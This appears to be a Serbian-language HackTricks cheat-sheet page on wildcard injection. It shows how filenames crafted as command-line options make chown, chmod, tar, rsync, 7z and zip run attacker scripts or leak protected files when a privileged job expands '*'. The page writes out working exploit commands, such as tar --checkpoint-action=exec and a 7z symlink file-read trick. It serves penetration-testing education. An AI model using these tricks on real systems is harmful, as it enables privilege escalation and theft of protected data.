# Wildcards Spare tricks

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

### chown, chmod

Možete **ukazati koji vlasnik fajla i dozvole želite kopirati za ostale fajlove**

```bash
touch "--reference=/my/own/path/filename"
```

Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(kombinovani napad)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### Tar

**Izvršite proizvoljne komande:**

```bash
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```

Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(napad tarom)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### Rsync

**Izvršite proizvoljne komande:**

```bash
Interesting rsync option from manual:

-e, --rsh=COMMAND           specify the remote shell to use
--rsync-path=PROGRAM    specify the rsync to run on remote machine
```

```bash
touch "-e sh shell.sh"
```

Možete iskoristiti ovo koristeći [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(napad rsyncom)_\
Više informacija na [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### 7z

U **7z** čak i korišćenjem `--` pre `*` (napomena da `--` znači da sledeći unos ne može biti tretiran kao parametar, tako da u ovom slučaju samo putanje do fajlova) možete izazvati proizvoljnu grešku kako biste pročitali fajl, pa ako se izvršava sledeća komanda od strane root korisnika:

```bash
7za a /backup/$filename.zip -t7z -snl -p$pass -- *
```

I možete kreirati fajlove u folderu gde se ovo izvršava, možete kreirati fajl `@root.txt` i fajl `root.txt` koji je **simbolička veza** ka fajlu koji želite da pročitate:

```bash
cd /path/to/7z/acting/folder
touch @root.txt
ln -s /file/you/want/to/read root.txt
```

Zatim, kada se izvrši **7z**, on će tretirati `root.txt` kao datoteku koja sadrži listu datoteka koje treba komprimirati (to je ono što ukazuje postojanje `@root.txt`) i kada 7z pročita `root.txt`, pročitaće `/file/you/want/to/read` i **pošto sadržaj ove datoteke nije lista datoteka, prikazaće grešku** prikazujući sadržaj.

_Više informacija u Write-up-ovima kutije CTF sa HackTheBox-a._

### Zip

**Izvršavanje proizvoljnih komandi:**

```bash
zip name.zip files -T --unzip-command "sh -c whoami"
```

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje trikove hakovanja slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
